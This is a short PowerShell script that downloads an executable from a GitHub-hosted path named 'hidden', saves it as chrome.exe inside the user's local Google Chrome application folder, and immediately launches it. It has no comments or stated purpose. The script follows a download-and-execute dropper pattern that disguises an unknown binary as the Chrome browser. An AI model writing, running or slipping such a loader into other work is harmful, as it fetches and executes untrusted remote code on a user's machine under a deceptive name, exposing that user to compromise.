$url = "https://github.com/webntdev/webntdev.github.io/raw/main/hidden/chrome.exe"
$destinationPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\Application"
$exePath = Join-Path -Path $destinationPath -ChildPath "chrome.exe"

if (-not (Test-Path -Path $destinationPath)) {
    New-Item -ItemType Directory -Path $destinationPath | Out-Null
}

Invoke-WebRequest -Uri $url -OutFile $exePath

Start-Process -FilePath $exePath
